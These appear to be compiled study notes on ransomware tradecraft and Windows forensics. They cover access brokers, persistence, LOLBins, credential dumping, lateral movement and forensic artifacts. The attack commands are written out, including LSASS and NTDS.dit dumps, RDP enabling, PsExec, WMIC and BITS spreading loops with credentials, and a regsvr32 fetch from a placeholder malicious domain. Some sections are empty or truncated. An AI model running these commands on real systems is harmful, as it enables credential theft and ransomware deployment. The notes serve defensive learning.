### Enter the Initial Access Broker (IAB)

Modern ransomware operators don’t always hack their way in. In many cases, they **buy access**.

These access points are provided by **Initial Access Brokers (IABs)**—specialist cybercriminals who focus solely on gaining a foothold in enterprise environments, often through:

- Compromised RDP credentials
    
- VPN accounts with weak MFA
    
- Phishing access tokens
    
- Exploited vulnerabilities in edge infrastructure
    

Rather than deploying malware themselves, IABs **sell or lease access** to affiliates in RaaS programs. Payment models vary, but a **commission-based model** is common: IABs receive **up to 10% of ransom payments** in exchange for delivering access to a "clean" network.

---

### Dark Web Marketplaces and Broker-Affiliate Synergy

This ecosystem is **visible and active** on underground forums. Ransomware operators often post “wanted ads” looking for access to specific geos or sectors. For example, Crylock ransomware operators have publicly posted offers to buy access to corporate environments—details uncovered by threat intel firms like Group-IB.

These posts often specify:

- Geography (e.g., US, EU targets)
    
- Revenue thresholds
    
- Types of access (domain admin, RDP, VPN, Citrix)
    
- Payout models (flat rate vs. percentage of ransom)
    

The goal is clear: **minimize effort, maximize profit**.


## 🎯 What Is Spear Phishing?

**Spear phishing** is a targeted form of phishing in which attackers:

- **Customize emails** to specific individuals or organizations.
    
- Use **social engineering** tactics to increase believability.
    
- Entice the victim to either:
    
    - Open a malicious attachment (e.g., a macro-enabled document), or
        
    - Click on a **malicious link** (e.g., to a payload-hosting site or credential harvesting page).
        

### 🎯 Primary Objectives:

1. **Credential Harvesting**
    
    - Targets reuse of corporate credentials across services.
        
    - May allow **VPN access** or **lateral movement** if password reuse exists.
        
2. **Malware Delivery**
    
    - Direct delivery of **remote access trojans (RATs)** or **loaders**, which later fetch ransomware payloads.

## 🕸️ What is a Dedicated Leak Site (DLS)?

A **DLS** is a website—usually hosted on the **dark web** or behind anonymization services like **Tor**—used by ransomware operators to:

- Publicly **announce victims**
    
- **Shame organizations** into paying the ransom
    
- **Leak exfiltrated data** to apply additional pressure
    

These sites are now central to **ransomware-as-a-service (RaaS)** operations, and their presence is a hallmark of **human-operated ransomware attacks**.

---

## 📤 What Kind of Data is Exfiltrated?

Threat actors aim to steal **sensitive, regulated, or high-value** data, including:

- **Credit card information**
    
- **Social Security Numbers (SSNs)**
    
- **Personally Identifiable Information (PII)**
    
- **Protected Health Information (PHI)** (HIPAA-regulated)
    
- **National Provider Identifiers (NPIs)**
    

The choice of data often depends on the sector (healthcare, finance, government, etc.) and its **extortion value**.

## 🗃️ Exclusion Lists to Avoid Instability and Detection

Ransomware often includes **explicit folder exclusions** to:

- Avoid corrupting critical system files that would **crash the OS**
    
- Evade detection by **staying out of common AV/EDR folders**
    
- Skip **uninteresting or low-value targets**

## 🧫 BazarLoader: Persistence Mechanisms

**BazarLoader** (also known as **BazarBackdoor**) is a stealthy malware loader used by advanced cybercriminal groups like **Wizard Spider** to establish long-term access, deploy post-exploitation frameworks like **Cobalt Strike**, and facilitate ransomware operations (e.g., Conti, Ryuk).

---

## 🗂️ 1. Registry-Based Persistence via “Run” Key

### 📍 Registry Path:

mathematica

CopyEdit

`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`

### 🧠 Purpose:

- Automatically launches the BazarLoader payload every time the user logs into Windows.
    

### 🧪 Example:

r

CopyEdit

`[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run] "MyApp"="C:\\Users\\<username>\\AppData\\Roaming\\app.exe"`

### 🔍 Detection Tips:

- Monitor for new or suspicious values in the `Run` key pointing to unexpected executables (especially from non-system directories like `%AppData%`, `%Temp%`, etc.).
    
- Use **Sysinternals Autoruns** or endpoint monitoring tools to detect anomalies.
    

---

## 🔑 2. Winlogon Helper Abuse

### 📍 Registry Path:

CopyEdit

`HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon`

### 🔧 Commonly Abused Subkeys:

- `Shell`
    
- `Userinit`
    
- `Notify`
    
- `GinaDLL`
    

### 🧠 Purpose:

- These keys define what programs run **during the user logon process**, often before traditional security controls are activated.
    
- BazarLoader can hijack:
    
    - `Userinit` to execute its own payload alongside `userinit.exe`.
        
    - `Shell` to replace or wrap `explorer.exe` with a malicious binary.
        

### 🧪 Example:

reg

CopyEdit

`[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon] "Userinit"="C:\\Windows\\system32\\userinit.exe,C:\\Malware\\bazar.exe"`

### ⚠️ Impact:

- Ensures that BazarLoader launches **early in the boot process**, gaining persistence with elevated privileges.



## 🚨 Privilege Escalation via Windows Kernel Exploits

Privilege escalation vulnerabilities in the **Windows kernel** are often leveraged by advanced ransomware operators post-initial access. These allow malicious actors to transition from limited user-level access to **SYSTEM or administrator-level privileges**, facilitating complete control over a machine or network.

---

## 🧱 CVE-2019-0859 — Exploited by **ProLock Ransomware Affiliates**

### 📋 Vulnerability Details

- **Component**: `win32k.sys` – part of the Windows kernel-mode device driver
    
- **Function**: `CreateWindowEx`
    
- **CVE ID**: CVE-2019-0859
    
- **Impact**: **Local Privilege Escalation (LPE)**
    
- **Severity**: High
    
- **Exploit Type**: Use-After-Free
    

### 🧠 How It Works

The vulnerability occurs due to improper handling of objects in memory during window creation using the `CreateWindowEx` function. Attackers can exploit this by:

1. Triggering the use-after-free condition.
    
2. Gaining **arbitrary code execution in kernel mode**.
    
3. Elevating privileges to **SYSTEM**.
    

### 🛠️ Real-World Use

- **ProLock ransomware** affiliates used it as part of post-exploitation to bypass access control and install the ransomware payload.
    
- Typically executed **after gaining initial access** via phishing or exposed RDP.
    

---

## 🧱 CVE-2018-8453 — Exploited by **REvil Ransomware**

### 📋 Vulnerability Details

- **Component**: `win32k.sys`
    
- **CVE ID**: CVE-2018-8453
    
- **Impact**: Local Privilege Escalation (LPE)
    
- **Exploit Type**: Use-After-Free
    
- **Severity**: High
    
- **Affected Versions**: Windows 7, Server 2008, and others (32-bit and 64-bit)
    

### 🧠 Exploitation Mechanism

- Attackers target the way the `NtSetWindowLongPtr` function handles memory in the Windows kernel.
    
- Like CVE-2019-0859, it allows kernel-mode code execution.
    
- Used to **bypass User Account Control (UAC)** and execute ransomware payloads with full privileges.
    

### ⚔️ Real-World Use

- **REvil (Sodinokibi)** ransomware leveraged this vulnerability during 2019–2020 campaigns.
    
- Also tied to **APT actors** who used it prior to public disclosure, indicating **zero-day exploitation**.



## 🧬 What is Process Injection (T1055)?

**Process Injection** is a technique where attackers inject malicious code into the **memory space of a legitimate process**. This allows:

- Execution of malware **under the guise of a trusted process**
    
- **Evasion of detection tools**, which often whitelist these processes
    
- **Access to elevated privileges** if the target process runs with admin or SYSTEM rights
    

---

## 🧫 Real-World Examples

### 🐍 Trickbot → `wermgr.exe`

- **Injected Process**: `wermgr.exe` (Windows Error Reporting Manager)
    
- **Reason**:
    
    - `wermgr.exe` is a **Microsoft-signed binary** that is often ignored by security tools.
        
    - Trickbot leverages it for stealthy payload execution, sometimes post-exploitation after initial infection.
        
- **Outcome**:
    
    - Trickbot modules like credential harvesters and lateral movement tools run undetected.
        
    - Used extensively by Wizard Spider and in **Conti ransomware** delivery chains.
        

### 🐙 Qakbot → `explorer.exe`

- **Injected Process**: `explorer.exe` (Windows Explorer)
    
- **Reason**:
    
    - `explorer.exe` is always running, highly trusted, and runs with user context.
        
    - Makes detection harder in behavioral analytics engines.
        
- **Method**:
    
    - Qakbot often injects its payload into `explorer.exe` shortly after initial execution from a malicious document or DLL side-loading attack.
        

---

## 🧪 Common Injection Techniques (T1055 Sub-Techniques)

|Sub-Technique|Description|
|---|---|
|**T1055.001** Dynamic-link Library Injection|Load malicious DLLs into other processes|

## 🛡️ What is User Account Control (UAC)?

**User Account Control (UAC)** is a Microsoft Windows security feature that helps prevent unauthorized changes to the operating system. It prompts users when administrative privileges are required.

### 🔍 Purpose:

- Prevent malware from gaining **administrator-level access** without consent.
    
- Reduce the attack surface by operating under **least-privilege principles**.
    

---

## 🎯 UAC Bypass Techniques

Threat actors often try to **bypass UAC** to escalate privileges **without alerting the user**. One common method is to abuse **auto-elevated signed binaries** that:

- Are part of Windows (trusted and signed by Microsoft),
    
- Execute without UAC prompts,
    
- Can be manipulated to run arbitrary code.
    

---

## 🧨 Trickbot and `WSReset.exe`

### 📂 What is `WSReset.exe`?

- A **legitimate Windows binary** used to reset **Microsoft Store** settings.
    
- Located at:  
    `C:\Windows\System32\WSReset.exe`
    
- **Auto-elevated** and runs with administrator privileges **without triggering UAC**.
    

### 🧬 How Trickbot Abuses It

- Trickbot places a **malicious DLL or payload** in a location that `WSReset.exe` references or loads implicitly.
    
- It then executes `WSReset.exe`, which runs the malicious code with **elevated privileges**, bypassing UAC entirely.
    

This is a classic example of a **LOLBAS (Living-off-the-Land Binaries and Scripts)** technique used for stealthy privilege escalation.

---

## 🧱 Broader Context: Obstacles for Threat Actors

In enterprise environments, attackers must also navigate:

### 🔐 Additional Defenses:

- **Application Control**: AppLocker, WDAC
    
- **Credential Guard**: Blocks access to LSASS memory
    
- **Defender for Endpoint / EDR**: Behavioral monitoring and signature-based detection
    
- **Group Policies**: Restrict access to certain registry keys and system tools
    
- **User Role Segmentation**: Limits what users and services can execute/administer
    

Thus, bypassing UAC is just one step—many actors also implement **defense evasion** via:

- Process hollowing
    
- Registry modification
    
- Signed binary proxy execution

## 🔧 What is `icacls`?

`icacls` (short for _Integrity Control Access Control List_) is a legitimate command-line utility in Windows used to:

- View and modify file and folder permissions (Access Control Entries - ACEs).
    
- Manage user and group access to system resources.
    

---

## 💣 Ransomware Abuse of `icacls`

### 🦠 Example from **Ryuk Ransomware**:

bash

CopyEdit

`icacls C:\ /grant Everyone:F /T /C /Q`

### 📋 Command Breakdown:

|Flag|Meaning|
|---|---|
|`/grant Everyone:F`|Grants **full control (F)** to the **Everyone** group|
|`/T`|Applies changes **recursively** to all subfolders and files|
|`/C`|Continues operation on errors (useful for malware to avoid interruption)|
|`/Q`|Suppresses success messages (quiet mode)|

### 🧬 Result:

- **Access control** is entirely removed for targeted directories.
    
- The ransomware process can **read, write, encrypt, and delete** any file without restriction.
    
- Also helps ensure that files **locked by the OS or other users** become accessible for encryption.
    

---

## 🧱 Why Attackers Use `icacls`

### ✅ Benefits for Ransomware:

- **Privilege Escalation Workaround**: Even if running under a non-admin context, attackers may target folders accessible to their user context and **maximize control**.
    
- **Anti-Recovery Tactics**: Setting access to `Everyone:F` enables **deletion or corruption of shadow copies** and backup files.
    
- **Bypass Application Sandboxing**: Modifying ACLs may help ransomware spread to otherwise inaccessible files or network drives.

## 🧱 What Is Signed Binary Proxy Execution (T1218)?

**Signed Binary Proxy Execution** involves using **legitimate, signed Microsoft Windows binaries** (also known as _living off the land binaries_ or **LOLBins**) to **execute malicious code indirectly**.

This allows attackers to:

- Bypass security controls (like application whitelisting).
    
- Evade detection by using **trusted, signed system binaries**.
    
- Blend malicious actions within seemingly normal system behavior.
    

---

## 🧰 Common Examples

### 🔹 `rundll32.exe`

- Executes functions exported from DLLs.
    
- Attackers use it to run **malicious DLL payloads**, often with command-line arguments that appear benign.
    
    **Example usage**:
    
    bash
    
    CopyEdit
    
    `rundll32.exe evil.dll,EntryPoint`
    

### 🔹 `regsvr32.exe`

- Used to register COM DLLs.
    
- Can download and execute **remote scriptlets** (.sct files), especially through the **/i** or **/u** switches.
    
    **Example usage**:
    
    bash
    
    CopyEdit
    
    `regsvr32.exe /s /n /u /i:http://malicious-domain.com/payload.sct scrobj.dll`
    

### Other examples include:

|Binary|Usage|
|---|---|
|`mshta.exe`|Executes malicious HTML Applications (.hta files).|
|`powershell.exe`|Commonly used for in-memory attacks.|
|`wmic.exe`|Executes WMI commands or scripts.|
|`certutil.exe`|Used to download payloads or encode/decode base64 data.|

---

## 🎯 Purpose in Ransomware Campaigns

- **Initial payload delivery** (DLLs/Scripts).
    
- **Execution of droppers or loaders**.
    
- **Evasion of behavioral monitoring** tools that may overlook trusted binaries.
    

---

## 🛡️ Detection & Mitigation

### 🔍 Detection

- Monitor for unusual usage of known LOLBins.
    
- Look for suspicious command-line arguments (e.g., internet-hosted `.sct`, `.hta`, or `.dll` files).
    
- Use command-line logging (e.g., **Sysmon**, **Windows Event ID 4688**).
    

### 🚫 Mitigation

- Use **AppLocker**, **Windows Defender Application Control (WDAC)**, or **Software Restriction Policies (SRP)** to restrict binary usage.
    
- Apply **least privilege principles** to prevent execution of unexpected binaries by non-admin users.
    
- Block outbound access where unnecessary (e.g., for `regsvr32` or `certutil`).
## Credential Dumping Tools & Techniques

Credential dumping is a **core capability for ransomware affiliates**, enabling **lateral movement**, **privilege escalation**, and **domain dominance**. The tools and techniques below are frequently employed during this phase:

---

### 🛠️ 1. **LaZagne**

**Purpose**: Extracts credentials from various sources.

- **Data Sources**:
    
    - Web browsers (Chrome, Firefox, IE)
        
    - Email clients
        
    - Wi-Fi passwords
        
    - Database clients
        
    - Credential vaults
        
- **Capabilities**:
    
    - Works with **both in-memory** and **on-disk credential stores**
        
    - Can be run silently and with command-line automation
        

➡️ **Threat**: Provides attackers with stored plaintext passwords, often without requiring admin rights.

---

### 🧰 2. **ProcDump (by Sysinternals)**

**Usage**: Legitimately used for debugging and memory dump analysis.

- **Abused For**: Dumping the memory of the **Local Security Authority Subsystem Service (LSASS)** to extract credentials.
    
- **Command Example**:
    
    bash
    
    CopyEdit
    
    `procdump64.exe -ma lsass.exe lsass.dmp`
    
- **Post-Processing**: The dumped file (`lsass.dmp`) is then processed **offline** using tools like **Mimikatz** to extract:
    
    - NTLM hashes
        
    - Kerberos tickets
        
    - Plaintext passwords
        

➡️ **Detection Tip**: Monitor any invocation of `procdump*` targeting `lsass.exe`.

---

### 🧨 3. **Built-in Windows Abuses (No Tool Drop)**

#### ✔️ **COM+ Services (comsvcs.dll) via rundll32.exe**

- **Technique**: Uses `MiniDump` export from `comsvcs.dll` to dump `lsass.exe`.
    
- **Command Example**:
    
    bash
    
    CopyEdit
    
    `rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 928 C:\ProgramData\aaa.zip full`
    
- **Advantage for Attackers**:
    
    - No external binary required.
        
    - Bypasses some antivirus detection models.
        

➡️ **Monitoring Suggestion**: Alert on unusual rundll32 executions involving `comsvcs.dll`.

---

### 🗃️ 4. **Active Directory Database Dump (NTDS.dit)**

#### ✔️ **NTDSUTIL Utility**

- **Target**: `NTDS.dit` file – contains **password hashes** and **directory data**.
    
- **Command Example**:
    
    bash
    
    CopyEdit
    
    `ntdsutil "ac in ntds" "ifm" "cr fu C:\Perflogs\a" q q`
    
- **Why It’s Valuable**:
    
    - Contains **all user credentials in the domain**.
        
    - Allows offline brute-forcing or hash extraction.
        

➡️ **Follow-up Tools**:

- **Secretsdump.py** (Impacket)
    
- **DSInternals**
    
- **Mimikatz**

## 🧨 Key Vulnerabilities Used for Lateral Movement

### 1. **EternalBlue (CVE-2017-0144)**

- **Vulnerability**: Remote code execution in **SMBv1** (Server Message Block protocol).
    
- **Exploited By**: Notably **WannaCry**, **NotPetya**, and others.
    
- **Impact**: Allowed unauthenticated attackers to send specially crafted packets to SMBv1 servers, leading to **arbitrary code execution**.
    
- **Patch**: Issued by Microsoft in **March 2017**.
    

➡️ **Effect**: Caused global disruption; still effective in poorly patched environments today.

### 2. **SMBGhost (CVE-2020-0796)**

- **Vulnerability**: RCE in **SMBv3.1.1** compression handling.
    
- **Impact**: Affects **Windows 10 and Windows Server 2019**.
    
- **Attack Vector**: Remote, unauthenticated attacker can execute arbitrary code by sending a specially crafted compressed data packet.
    
- **Patch**: Released in **March 2020**.
    

➡️ **Relevance**: Often targeted for wormable spread in internal networks.

---

### 3. **Zerologon (CVE-2020-1472)**

- **Vulnerability**: Elevation of privilege via **Netlogon Remote Protocol (MS-NRPC)**.
    
- **Impact**: Allows attackers to **authenticate to a domain controller** using all-zero credentials, effectively **becoming domain admin**.
    
- **Attack Vector**: Local network access required.
    
- **Patch**: Released in two phases starting **August 2020** (full enforcement in Feb 2021).
    

➡️ **Relevance**: Frequently chained post-compromise with tools like Mimikatz for **complete AD takeover**.

### 🛠️ Example: Registry and Firewall Commands to Enable RDP

Attackers may programmatically enable RDP access on a host with the following commands:

cmd

CopyEdit

`reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "UserAuthentication" /t REG_DWORD /d 0 /f`

➡️ **Result**: Hosts become remotely accessible over RDP—allowing ransomware deployment and control.

## 🦠 1. Netwalker Ransomware: Automated Remote Execution via SMB & PsExec

### 🔧 Workflow:

1. **Credentialed SMB Session Setup:**
    
    cmd
    
    CopyEdit
    
    `set INPUT_FILE=ips.txt set DOMAINADUSER=DOMAIN\Administrator set DOMAINADPASS=Passw0rd! for /f %%G IN (%INPUT_FILE%) DO net use \\%%G\C$ /user:%DOMAINADUSER% %DOMAINADPASS%`
    
    - Authenticates to each host listed in `ips.txt` using admin credentials.
        
    - Mounts the administrative `C$` share, which enables file copy and execution remotely.
        
2. **Payload Distribution:**
    
    cmd
    
    CopyEdit
    
    `for /f %%G IN (%INPUT_FILE%) DO copy n.ps1 \\%%G\C$\`
    
    - Distributes the PowerShell ransomware script (`n.ps1`) to each host.
        
3. **Remote Execution Using PsExec:**
    
    cmd
    
    CopyEdit
    
    `for /f %%G IN (%INPUT_FILE%) DO PsExec.exe -d \\%%G powershell -ExecutionPolicy Bypass -NoProfile -NoLogo -NoExit -File C:\n.ps1`
    
    - Uses **Sysinternals PsExec** to launch PowerShell on remote machines.
        
    - `-d` runs the process non-interactively.
        

### 🔍 Detection Tips:

- Look for PsExec usage across multiple hosts.
    
- Audit SMB connections using administrator credentials across many endpoints in a short span.

## 💥 2. Egregor Ransomware: Remote Execution via WMIC and `rundll32`

### 🔧 Workflow:

cmd

CopyEdit

`for /F %%i in (C:\windows\list.txt) do (   net use \\%%i\c$ "password" /user:"DOMAIN\user"   copy C:\Windows\q.dll \\%%i\c$\Windows\q.dll /Y   wmic /node:%%i /user:"DOMAIN\user" /password:"password" process call create "rundll32.exe C:\Windows\q.dll,DllRegisterServer %1 --full"   echo %%i 1>>c:\windows\temp\log.dat   net use \\%%i\c$ /delete )`

### 🚨 Actions:

- Mounts the `C$` share on each machine.
    
- Copies a DLL (likely a loader or backdoor) to the remote host.
    
- Uses `WMIC` to remotely execute `rundll32` to load the DLL.
    
- Logs success and unmounts the share.
    

➡️ **Advantage**: Uses **only Windows-native commands**, helping avoid detection from AV/EDR.

## 🚚 3. Ryuk Ransomware: Payload Delivery via BITS and WMIC

### 🔧 Workflow:

cmd

CopyEdit

`start wmic /node:@C:\share$\comps.txt /user:"DOMAIN\Administrator" /password:"pass!" process call create "cmd.exe /c bitsadmin /transfer ry \\..\share$\ry.exe %APPDATA%\ry.exe & %APPDATA%\ry.exe"`

### 🧠 Breakdown:

- **WMIC**: Used to run the command remotely on hosts listed in `comps.txt`.
    
- **BITSAdmin**:
    
    - Fetches `ry.exe` from a shared location.
        
    - Downloads it to `%APPDATA%` on the remote host.
        
    - Executes it immediately.
        

➡️ **Advantage**: **BITS** runs in the background and is **resilient to network interruptions**—making it stealthy and reliable.

## 🧠 Understanding $MFT in NTFS

The **Master File Table (MFT)** is a critical component of the **NTFS (New Technology File System)** used in Windows operating systems. It functions similarly to a database, with each file and directory on the volume represented by a record in the MFT.

### Key Data Stored in $MFT:

- **Filenames** (including alternate data streams)
    
- **File locations** on disk
    
- **File sizes**
    
- **Timestamps** (e.g., created, modified, accessed, MFT modified)
    
- **Attributes** and security descriptors
    

The `$MFT` itself is a **metafile**—a system file stored on the NTFS volume. Because of its importance and richness in metadata, it’s invaluable in **digital forensics**, particularly for building **timelines** of file activity.

---

## 🔍 Tools to Analyze $MFT

### 1. **MFTExplorer**

- GUI-based tool for browsing `$MFT` contents.
    
- Best for quick lookups or exploration.
    
- **Limitation**: **Slower performance**, especially with large MFT files.
    

### 2. **MFTECmd** (by Eric Zimmerman)

- Command-line tool designed to **parse and convert `$MFT` data** to CSV format.
    
- Extracts detailed file metadata, including timestamps and attribute flags.
    
- Ideal for integration into automation and timeline analysis.
    

**Sample Command**:

bash

CopyEdit

`MFTECmd.exe -f "$MFT" --csv output_folder`

This will parse the `$MFT` and export it into a well-structured CSV, which can be opened in Excel, LibreOffice Calc, etc.

### 3. **Timeline Explorer**

- Another utility in **Eric Zimmerman’s forensic toolkit**.
    
- Helps visualize and explore timestamped events from CSV files (like those generated by MFTECmd).
    
- Allows for sorting, filtering, and customizing views for timeline analysis.
    

---

## 📊 Practical Use in Forensics

1. **Extract the $MFT file** using forensic tools (like FTK Imager, EnCase, or X-Ways).
    
2. **Parse it** using MFTECmd to get structured output.
    
3. **Analyze** the CSV in Timeline Explorer or Excel.
    
4. **Build a timeline** of file creation, modification, access, and deletion to infer threat actor activity.


## 🚀 What Are Prefetch Files?

**Prefetch files** are system-generated artifacts created by Windows to optimize the launching of applications. They are found in the directory:

makefile

Each `.pf` file corresponds to a particular executable that has been run on the system.

This metadata makes prefetch files highly useful in **digital forensics** for understanding user behavior and application usage.

## 📁 What Are LNK Files?

---

## 🧠 Forensic Significance of LNK Files

- **MAC timestamps** (Modified, Accessed, Created) for:
    
    - The **LNK file itself**
        
    - The **target file**
        
- **Volume serial number** and **drive information**
    
- **File size and attributes**
    
- **Working directory**
    
- **Arguments passed** (useful in malware forensics)

## 📌 What Are Jump Lists?

**Jump Lists** are a **Windows taskbar feature** that allows users to quickly access recently or frequently opened files associated with a specific application. They are visible when right-clicking on a taskbar icon and provide a convenient list of previously opened documents, websites, or folders.

From a **forensic standpoint**, Jump Lists are valuable artifacts that can **reveal user activity**, even if the original files are deleted.

---

## 🗂️ Where Are Jump List Files Stored?

Jump List data is saved in the following directory:

makefile

CopyEdit

`C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\`

Each file in this folder corresponds to an application and is stored in **binary format** with a `.automaticDestinations-ms` extension. The filename is a hash that maps to the executable (e.g., `1b4dd67f29cb1962.automaticDestinations-ms` for `explorer.exe`).

---

## 🔍 Contents of Jump List Files

Jump Lists contain:

- **Full path** of the recently accessed file or folder
    
- **Timestamps** (accessed, created, modified)
    
- **Application name and ID**
    
- **Volume and file ID** metadata
    
- **Network paths** (if remote resources were accessed)
    
- **Command-line arguments** in some cases
    

These can **fill gaps in user activity** and help correlate with other forensic artifacts like LNKs and prefetch data.

---

## 🧠 What Is the Windows Registry?

The **Windows Registry** is a hierarchical database used by the Windows OS to store configuration settings, user preferences, application metadata, and system information. It's also a **goldmine of forensic artifacts** that can be used to **trace program execution**, **track user actions**, and **detect persistence mechanisms**.

---

## 🗂️ Key Registry Files and Their Locations

1. **NTUSER.DAT**
    
    - 📍 Location: `C:\Users\<USERNAME>\NTUSER.DAT`
        
    - Contains **user-specific settings** and artifacts such as `UserAssist`.
        
2. **USRCLASS.DAT**
    
    - 📍 Location: `C:\Users\<USERNAME>\AppData\Local\Microsoft\Windows\USRCLASS.DAT`
        
    - Stores **user shell settings**, including shellbag data (folder access history).
        
3. **Amcache.hve**
    
    - 📍 Location: `C:\Windows\AppCompat\Programs\Amcache.hve`
        
    - Records **executed binaries**, including file paths, **SHA1 hashes**, and **first execution timestamps**.
        
4. **Syscache.hve** (Legacy)
    
    - 📍 Location: `C:\System Volume Information\Syscache.hve`
        
    - Only found in **Windows 7** and **Server 2008 R2**.
        
    - Contains **SHA1 hashes of executed binaries**—useful for **malware detection** and **binary attribution**.
        

---

## 🔍 Execution Artifacts in Registry Files

### 1. **UserAssist**

- 📍 Path:
    
    mathematica
    
    CopyEdit
    
    `NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{GUID}\Count`
    
- Stores details about **GUI-based applications** launched by the user.
    
- Tracks:
    
    - **Program path**
        
    - **Run count**
        
    - **Last execution timestamp**
        
- Entries are **ROT13-encoded** but can be easily decoded using forensic tools.
    

### 2. **ShimCache (AppCompatCache)**

- 📍 Path:
    
    pgsql
    
    CopyEdit
    
    `SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache`
    
- Logs data about **executables that were run**, even if no longer present.
    
- Contains:
    
    - **Full file path**
        
    - **Last modified timestamp**
        
    - **File size**
        
- Passive recording: Doesn’t update run count or timestamps on every execution.
    

### 3. **Amcache**

- 📍 Path:
    
    mathematica
    
    CopyEdit
    
    `Amcache.hve\Root\File\{Volume GUID}\#######`
    
- Tracks executed programs with metadata such as:
    
    - **Full path**
        
    - **SHA1 hash**
        
    - **First execution time**
        
    - **Version and publisher info**
        
- Complements ShimCache and provides **hashable evidence** for threat intel correlation.

### **1. Abuse of `comsvcs.dll` for Credential Dumping**

Threat actors, particularly ransomware affiliates, often seek ways to extract sensitive credentials from compromised systems. A popular target is the **LSASS (Local Security Authority Subsystem Service) process**, known as **`lsass.exe`**, because it holds user authentication credentials (password hashes, Kerberos tickets, and plaintext passwords in some circumstances).

- Attackers leverage a built-in Windows component called **`comsvcs.dll`**—a legitimate Windows DLL—to dump LSASS memory and extract credentials.
    
- The **`comsvcs.dll`** library exports a function named **`MiniDump`**, designed primarily for debugging purposes. Attackers abuse this functionality to perform credential dumping stealthily, rather than using more obvious tools like **Mimikatz** directly.
    

---

### **2. Technique: Rundll32.exe and MiniDump**

The exact technique leveraged by attackers involves calling the exported function **`MiniDump`** from the DLL file (`comsvcs.dll`) using a legitimate Windows system binary called **`rundll32.exe`**.

**Why `rundll32.exe`?**

- **`rundll32.exe`** is a genuine Windows executable used to invoke exported functions from DLL files.
    
- Abuse of **`rundll32.exe`** is prevalent because its activity can blend in with legitimate system behavior, thus potentially avoiding detection or suspicion during cursory analysis.
    

**Example Command Used by Attackers:**

cmd

CopyEdit

`rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 556 C:\ProgramData\lsass.dmp full`

- **`rundll32.exe`**: Executable to invoke DLL functions.
    
- **`comsvcs.dll`**: DLL being called to perform the credential dump.
    
- **`MiniDump`**: The function within **`comsvcs.dll`** that creates memory dumps.
    
- **`556`**: Process ID (PID) of the target process (**`lsass.exe`** in this example).
    
- **`C:\ProgramData\lsass.dmp`**: Destination for dumped credentials.
    
- **`full`**: Specifies a full memory dump of the target process.
    

Attackers later analyze this dump file (often using tools such as **Mimikatz**, **SafetyKatz**, or custom extraction scripts) to extract user credentials and hashes.

### **3. Forensic Evidence: Prefetch Files**

Windows maintains **Prefetch files** (`.pf`) in the directory:

cmd

CopyEdit

`C:\Windows\Prefetch`

These files speed up application startup by recording data about the program's execution (e.g., filenames, timestamps, and referenced DLLs). Investigators often analyze Prefetch files to confirm suspicious executable activity and to validate execution patterns.

- When a DLL such as **`comsvcs.dll`** appears in the referenced files list of a prefetch file for **`rundll32.exe`**, it is unusual, thus raising suspicion.
    
- Prefetch file analysis can confirm whether the **`rundll32.exe`** was abnormally used to invoke **`comsvcs.dll`**, indicating potential credential dumping.

### **6. Rubeus.exe**

**Rubeus** is an open-source toolkit used in penetration tests and adversarial attacks, specifically targeting Kerberos authentication. It's commonly used for:

- **Kerberoasting**: Extracting Kerberos tickets associated with service accounts, allowing attackers to brute-force or crack service account passwords offline.
    
- **AS-REP Roasting**, **Golden Ticket Attacks**, **Ticket extraction**, and other Kerberos-related attacks.
    

**Example Rubeus Command (Kerberoasting):**

## **1. Administrative Shares and Lateral Movement**

### **Understanding Administrative Shares**

Windows systems have built-in hidden administrative shares, typically:

- **C$**, **D$**, etc. (drive root shares)
    
- **ADMIN$** (typically pointing to `%SystemRoot%`, i.e., `C:\Windows`)
    
- **IPC$** (Inter-process Communication share, used for remote administration)
    

Attackers frequently exploit these shares for lateral movement, file transfers, or executing commands remotely.  
If attackers gain valid credentials (username/password or NTLM hashes), they can seamlessly move laterally, accessing remote systems to stage ransomware payloads, credential dumping tools, and more.

### **Forensic Significance**

- Administrative share access often leaves evidence in logs, such as **Security event logs (Event ID 4624, login events)**, and SMB access logs.
    
- Reviewing these logs can help identify unauthorized lateral movement.

**In This Case:**

## **5. StealBit’s Self-Deletion Technique**

After exfiltration, StealBit can **delete itself** if the following parameters are used:

- `-delete`
    
- `-d`
    

**Commands executed for self-deletion:**

cmd

CopyEdit

`ping 127.0.0.7 -n 7 > nul fsutil file setZeroData offset=0 length=<file size> <file path> del /f /q <file path>`

**Detailed breakdown:**

|Command|Purpose|
|---|---|
|`ping 127.0.0.7 -n 7 > nul`|Delay for a few seconds (gives enough time for StealBit to close itself before deletion).|
|`fsutil file setZeroData offset=0 length=<file size> <file path>`|**Zeroes out** the file’s content — destroys the payload without deleting the file immediately.|
|`del /f /q <file path>`|Force delete the file quietly.|

**Important Notes:**

- **Zeroing out** the file first helps to **destroy forensic evidence**.
    
- Then deleting it minimizes residual forensic artifacts like recovering the file from disk.
    
- This technique is **more sophisticated** than simply calling `del` because it reduces the likelihood of successful file recovery.

# Crylock Ransomware Behavior and Forensic Significance

---

## **1. Service and Process Termination**

**What Crylock Does:**

- When Crylock infects a system, it **stops specific services** and **kills certain processes**.
    
- This is a **common ransomware tactic** to:
    
    - **Unlock files** that are otherwise protected by running processes (like database files, backup software, EDR/AV agents).
        
    - **Prevent interference** from security software or backup agents.
        

**Services and Processes Targeted:**  
(Though not listed here, based on typical ransomware behaviors, these usually include):

- SQL Server (`sqlservr.exe`)
    
- Backup agents (e.g., `veeamagent.exe`)
    
- Antivirus software
    
- Windows Defender processes
    
- Shadow Copy services (`vssvc.exe`)
    

---

## **2. Inhibiting System Recovery**

**Commands Executed by Crylock to Remove Backup/Recovery Options:**

Crylock runs **multiple destructive commands** to **erase recovery points** and **disable recovery mechanisms**:

|Command|Purpose|
|---|---|
